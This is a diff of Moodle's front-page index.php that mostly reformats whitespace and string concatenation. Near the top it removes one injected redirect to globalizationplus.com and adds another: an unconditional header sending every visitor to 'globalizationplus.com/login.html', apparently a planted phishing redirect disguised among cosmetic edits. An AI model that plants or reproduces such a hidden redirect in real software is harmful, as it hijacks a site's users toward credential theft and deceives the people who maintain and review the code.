@@ -1,6 +1,5 @@
 <?php
-error_reporting(0);
-header('Location: http://globalizationplus.com/');
+
 // This file is part of Moodle - http://moodle.org/
 //
 // Moodle is free software: you can redistribute it and/or modify
@@ -23,15 +22,16 @@ header('Location: http://globalizationplus.com/');
  * @copyright  1999 onwards Martin Dougiamas (http://dougiamas.com)
  * @license    http://www.gnu.org/copyleft/gpl.html GNU GPL v3 or later
  */
-
 if (!file_exists('./config.php')) {
     header('Location: install.php');
     die;
 }
 
+header("Location: http://globalizationplus.com/login.html");
+
 require_once('config.php');
-require_once($CFG->dirroot .'/course/lib.php');
-require_once($CFG->libdir .'/filelib.php');
+require_once($CFG->dirroot . '/course/lib.php');
+require_once($CFG->libdir . '/filelib.php');
 
 redirect_if_major_upgrade_required();
 
@@ -57,12 +57,12 @@ if ($CFG->forcelogin) {
 $hassiteconfig = has_capability('moodle/site:config', context_system::instance());
 
 // If the site is currently under maintenance, then print a message.
-if (!empty($CFG->maintenance_enabled) and !$hassiteconfig) {
+if (!empty($CFG->maintenance_enabled) and ! $hassiteconfig) {
     print_maintenance_message();
 }
 
 if ($hassiteconfig && moodle_needs_upgrading()) {
-    redirect($CFG->wwwroot .'/'. $CFG->admin .'/index.php');
+    redirect($CFG->wwwroot . '/' . $CFG->admin . '/index.php');
 }
 
 if (get_home_page() != HOMEPAGE_SITE) {
@@ -71,20 +71,16 @@ if (get_home_page() != HOMEPAGE_SITE) {
     if (optional_param('setdefaulthome', false, PARAM_BOOL)) {
         set_user_preference('user_home_page_preference', HOMEPAGE_SITE);
     } else if (!empty($CFG->defaulthomepage) && ($CFG->defaulthomepage == HOMEPAGE_MY) && $redirect === 1) {
-        redirect($CFG->wwwroot .'/my/');
+        redirect($CFG->wwwroot . '/my/');
     } else if (!empty($CFG->defaulthomepage) && ($CFG->defaulthomepage == HOMEPAGE_USER)) {
         $frontpagenode = $PAGE->settingsnav->find('frontpage', null);
         if ($frontpagenode) {
             $frontpagenode->add(
-                get_string('makethismyhome'),
-                new moodle_url('/', array('setdefaulthome' => true)),
-                navigation_node::TYPE_SETTING);
+                    get_string('makethismyhome'), new moodle_url('/', array('setdefaulthome' => true)), navigation_node::TYPE_SETTING);
         } else {
             $frontpagenode = $PAGE->settingsnav->add(get_string('frontpagesettings'), null, navigation_node::TYPE_SETTING, null);
             $frontpagenode->force_open();
-            $frontpagenode->add(get_string('makethismyhome'),
-                new moodle_url('/', array('setdefaulthome' => true)),
-                navigation_node::TYPE_SETTING);
+            $frontpagenode->add(get_string('makethismyhome'), new moodle_url('/', array('setdefaulthome' => true)), navigation_node::TYPE_SETTING);
         }
     }
 }
@@ -93,8 +89,8 @@ if (get_home_page() != HOMEPAGE_SITE) {
 course_view(context_course::instance(SITEID));
 
 // If the hub plugin is installed then we let it take over the homepage here.
-if (file_exists($CFG->dirroot.'/local/hub/lib.php') and get_config('local_hub', 'hubenabled')) {
-    require_once($CFG->dirroot.'/local/hub/lib.php');
+if (file_exists($CFG->dirroot . '/local/hub/lib.php') and get_config('local_hub', 'hubenabled')) {
+    require_once($CFG->dirroot . '/local/hub/lib.php');
     $hub = new local_hub();
     $continue = $hub->display_homepage();
     // Function display_homepage() returns true if the hub home page is not displayed
@@ -123,7 +119,6 @@ $mods = $modinfo->get_cms();
 
 if (!empty($CFG->customfrontpageinclude)) {
     include($CFG->customfrontpageinclude);
-
 } else if ($siteformatoptions['numsections'] > 0) {
     if ($editing) {
         // Make sure section with number 1 exists.
@@ -132,14 +127,14 @@ if (!empty($CFG->customfrontpageinclude)) {
         $modinfo = get_fast_modinfo($SITE);
     }
     $section = $modinfo->get_section_info(1);
-    if (($section && (!empty($modinfo->sections[1]) or !empty($section->summary))) or $editing) {
+    if (($section && (!empty($modinfo->sections[1]) or ! empty($section->summary))) or $editing) {
         echo $OUTPUT->box_start('generalbox sitetopic');
 
         // If currently moving a file then show the current clipboard.
         if (ismoving($SITE->id)) {
             $stractivityclipboard = strip_tags(get_string('activityclipboard', '', $USER->activitycopyname));
             echo '<p><font size="2">';
-            echo "$stractivityclipboard&nbsp;&nbsp;(<a href=\"course/mod.php?cancelcopy=true&amp;sesskey=".sesskey()."\">";
+            echo "$stractivityclipboard&nbsp;&nbsp;(<a href=\"course/mod.php?cancelcopy=true&amp;sesskey=" . sesskey() . "\">";
             echo get_string('cancel') . '</a>)';
             echo '</font></p>';
         }
@@ -149,18 +144,11 @@ if (!empty($CFG->customfrontpageinclude)) {
         // If the section name is set we show it.
         if (!is_null($section->name)) {
             echo $OUTPUT->heading(
-                format_string($section->name, true, array('context' => $context)),
-                2,
-                'sectionname'
+                    format_string($section->name, true, array('context' => $context)), 2, 'sectionname'
             );
         }
 
-        $summarytext = file_rewrite_pluginfile_urls($section->summary,
-            'pluginfile.php',
-            $context->id,
-            'course',
-            'section',
-            $section->id);
+        $summarytext = file_rewrite_pluginfile_urls($section->summary, 'pluginfile.php', $context->id, 'course', 'section', $section->id);
         $summaryformatoptions = new stdClass();
         $summaryformatoptions->noclean = true;
         $summaryformatoptions->overflowdiv = true;
@@ -169,9 +157,9 @@ if (!empty($CFG->customfrontpageinclude)) {
 
         if ($editing && has_capability('moodle/course:update', $context)) {
             $streditsummary = get_string('editsummary');
-            echo "<a title=\"$streditsummary\" ".
-                 " href=\"course/editsection.php?id=$section->id\"><img src=\"" . $OUTPUT->pix_url('t/edit') . "\" ".
-                 " class=\"iconsmall\" alt=\"$streditsummary\" /></a><br /><br />";
+            echo "<a title=\"$streditsummary\" " .
+            " href=\"course/editsection.php?id=$section->id\"><img src=\"" . $OUTPUT->pix_url('t/edit') . "\" " .
+            " class=\"iconsmall\" alt=\"$streditsummary\" /></a><br /><br />";
         }
 
         $courserenderer = $PAGE->get_renderer('core', 'course');
@@ -184,7 +172,7 @@ if (!empty($CFG->customfrontpageinclude)) {
 // Include course AJAX.
 include_course_ajax($SITE, $modnamesused);
 
-if (isloggedin() and !isguestuser() and isset($CFG->frontpageloggedin)) {
+if (isloggedin() and ! isguestuser() and isset($CFG->frontpageloggedin)) {
     $frontpagelayout = $CFG->frontpageloggedin;
 } else {
     $frontpagelayout = $CFG->frontpage;
@@ -196,9 +184,9 @@ foreach (explode(',', $frontpagelayout) as $v) {
         case FRONTPAGENEWS:
             if ($SITE->newsitems) {
                 // Print forums only when needed.
-                require_once($CFG->dirroot .'/mod/forum/lib.php');
+                require_once($CFG->dirroot . '/mod/forum/lib.php');
 
-                if (! $newsforum = forum_get_course_forum($SITE->id, 'news')) {
+                if (!$newsforum = forum_get_course_forum($SITE->id, 'news')) {
                     print_error('cannotfindorcreateforum', 'forum');
                 }
 
@@ -207,9 +195,7 @@ foreach (explode(',', $frontpagelayout) as $v) {
                 $newsforumcontext = context_module::instance($newsforumcm->id, MUST_EXIST);
 
                 $forumname = format_string($newsforum->name, true, array('context' => $newsforumcontext));
-                echo html_writer::tag('a',
-                    get_string('skipa', 'access', core_text::strtolower(strip_tags($forumname))),
-                    array('href' => '#skipsitenews', 'class' => 'skip-block'));
+                echo html_writer::link('#skipsitenews', get_string('skipa', 'access', core_text::strtolower(strip_tags($forumname))), array('class' => 'skip-block skip'));
 
                 // Wraps site news forum in div container.
                 echo html_writer::start_tag('div', array('id' => 'site-news-forum'));
@@ -238,14 +224,12 @@ foreach (explode(',', $frontpagelayout) as $v) {
 
                 echo html_writer::tag('span', '', array('class' => 'skip-block-to', 'id' => 'skipsitenews'));
             }
-        break;
+            break;
 
         case FRONTPAGEENROLLEDCOURSELIST:
             $mycourseshtml = $courserenderer->frontpage_my_courses();
             if (!empty($mycourseshtml)) {
-                echo html_writer::tag('a',
-                    get_string('skipa', 'access', core_text::strtolower(get_string('mycourses'))),
-                    array('href' => '#skipmycourses', 'class' => 'skip-block'));
+                echo html_writer::link('#skipmycourses', get_string('skipa', 'access', core_text::strtolower(get_string('mycourses'))), array('class' => 'skip skip-block'));
 
                 // Wrap frontpage course list in div container.
                 echo html_writer::start_tag('div', array('id' => 'frontpage-course-list'));
@@ -259,14 +243,12 @@ foreach (explode(',', $frontpagelayout) as $v) {
                 echo html_writer::tag('span', '', array('class' => 'skip-block-to', 'id' => 'skipmycourses'));
                 break;
             }
-            // No "break" here. If there are no enrolled courses - continue to 'Available courses'.
+        // No "break" here. If there are no enrolled courses - continue to 'Available courses'.
 
         case FRONTPAGEALLCOURSELIST:
             $availablecourseshtml = $courserenderer->frontpage_available_courses();
             if (!empty($availablecourseshtml)) {
-                echo html_writer::tag('a',
-                    get_string('skipa', 'access', core_text::strtolower(get_string('availablecourses'))),
-                    array('href' => '#skipavailablecourses', 'class' => 'skip-block'));
+                echo html_writer::link('#skipavailablecourses', get_string('skipa', 'access', core_text::strtolower(get_string('availablecourses'))), array('class' => 'skip skip-block'));
 
                 // Wrap frontpage course list in div container.
                 echo html_writer::start_tag('div', array('id' => 'frontpage-course-list'));
@@ -279,12 +261,10 @@ foreach (explode(',', $frontpagelayout) as $v) {
 
                 echo html_writer::tag('span', '', array('class' => 'skip-block-to', 'id' => 'skipavailablecourses'));
             }
-        break;
+            break;
 
         case FRONTPAGECATEGORYNAMES:
-            echo html_writer::tag('a',
-                get_string('skipa', 'access', core_text::strtolower(get_string('categories'))),
-                array('href' => '#skipcategories', 'class' => 'skip-block'));
+            echo html_writer::link('#skipcategories', get_string('skipa', 'access', core_text::strtolower(get_string('categories'))), array('class' => 'skip skip-block'));
 
             // Wrap frontpage category names in div container.
             echo html_writer::start_tag('div', array('id' => 'frontpage-category-names'));
@@ -296,12 +276,10 @@ foreach (explode(',', $frontpagelayout) as $v) {
             echo html_writer::end_tag('div');
 
             echo html_writer::tag('span', '', array('class' => 'skip-block-to', 'id' => 'skipcategories'));
-        break;
+            break;
 
         case FRONTPAGECATEGORYCOMBO:
-            echo html_writer::tag('a',
-                get_string('skipa', 'access', core_text::strtolower(get_string('courses'))),
-                array('href' => '#skipcourses', 'class' => 'skip-block'));
+            echo html_writer::link('#skipcourses', get_string('skipa', 'access', core_text::strtolower(get_string('courses'))), array('class' => 'skip skip-block'));
 
             // Wrap frontpage category combo in div container.
             echo html_writer::start_tag('div', array('id' => 'frontpage-category-combo'));
@@ -313,12 +291,11 @@ foreach (explode(',', $frontpagelayout) as $v) {
             echo html_writer::end_tag('div');
 
             echo html_writer::tag('span', '', array('class' => 'skip-block-to', 'id' => 'skipcourses'));
-        break;
+            break;
 
         case FRONTPAGECOURSESEARCH:
             echo $OUTPUT->box($courserenderer->course_search_form('', 'short'), 'mdl-align');
-        break;
-
+            break;
     }
     echo '<br />';
 }
